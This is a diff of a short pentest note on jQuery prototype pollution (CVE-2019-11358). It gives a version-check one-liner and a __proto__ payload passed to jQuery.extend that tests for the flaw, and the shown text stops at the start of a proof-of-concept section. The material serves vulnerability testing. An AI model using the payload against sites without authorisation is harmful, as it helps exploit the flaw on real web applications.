@@ -1,14 +1,14 @@
 # Prototype pollution
 
 ### CVE-2019-11358
-check version JQuery:
+- check version JQuery:
 ```jQuery && jQuery.fn && console.log(jQuery.fn.jquery);```
-check vuln:
+- check vuln:
 ```
 jQuery.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
 console.log("After:", ({}).polluted); // если true/ "yes" — уязвимо
 ```
-poc: 
+- poc: 
 ```
 // 1) Сначала очистим старые следы (ещё раз, на всякий случай)
 try { delete Object.prototype.__poc_alert; } catch(e){}
